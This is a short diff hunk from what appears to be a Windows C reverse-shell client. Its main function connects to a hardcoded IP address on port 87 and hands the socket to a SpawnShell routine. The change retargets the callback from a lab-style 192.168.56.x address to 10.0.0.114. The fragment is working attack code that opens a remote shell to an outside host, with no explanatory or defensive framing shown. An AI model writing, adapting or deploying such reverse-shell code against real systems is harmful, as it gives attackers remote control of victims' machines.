@@ -78,7 +78,7 @@ void SpawnShell(SOCKET s) {
 
 
 int main() {
-    SOCKET s = ConnectToServer("192.168.56.101", 87);
+    SOCKET s = ConnectToServer("10.0.0.114", 87);
     if (s == INVALID_SOCKET) return -1;
     SpawnShell(s);
     closesocket(s);
